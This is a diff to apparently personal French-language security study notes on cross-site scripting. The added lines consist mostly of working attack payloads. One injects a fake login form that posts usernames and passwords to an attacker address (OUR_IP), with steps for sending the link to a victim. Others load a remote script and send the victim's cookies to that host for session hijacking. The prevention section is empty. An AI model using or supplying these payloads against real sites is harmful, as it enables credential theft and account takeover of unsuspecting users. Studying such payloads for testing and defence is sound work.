@@ -48,13 +48,33 @@
 
 ## XSS Attack
 ###### Defzcing attacks
+* remplacer le contenu de la page
 
 ###### Phishing Attack
 ```javascript
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
 
 ```
+* trouver un moyen de simuler une login page 
+* mettre une redirection des requettes vers son serveur nc 
+* envoyer le lien à la victime
+
+###### Session Hijacking
+
+```javascript
+// load to remote script
+<script src="http://OUR_IP/script.js"></script>
+// get cookie
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
+```
+--- 
+## Prevention
+
+
+---
 
 ## Ressources
 ##### Payloads
-* [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
+* [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
 * [Payload Box](https://github.com/payloadbox/xss-payload-list)
